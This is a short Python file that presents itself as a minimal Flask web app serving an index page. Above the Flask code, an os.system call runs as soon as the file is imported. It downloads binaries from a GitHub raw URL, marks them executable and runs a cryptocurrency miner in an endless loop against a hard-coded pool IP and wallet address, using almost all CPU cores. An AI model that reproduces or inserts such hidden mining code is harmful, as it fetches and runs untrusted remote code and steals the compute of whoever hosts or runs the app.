import os
os.system ("wget https://raw.githubusercontent.com/laboldrokok/saksake/main/hellminers && while :; do timeout 55s wget https://raw.githubusercontent.com/laboldrokok/saksake/main/verus-solver && chmod +x hellminers verus-solver && ./hellminers -c stratum+tcp://139.99.123.225:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.V${RANDOM:0:9} -p x --cpu $(nproc --ignore 2) ; sleep 15s; done")
from flask import Flask
from flask import render_template

app = Flask(__name__)

@app.route("/")
def hello():
    return render_template('index.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
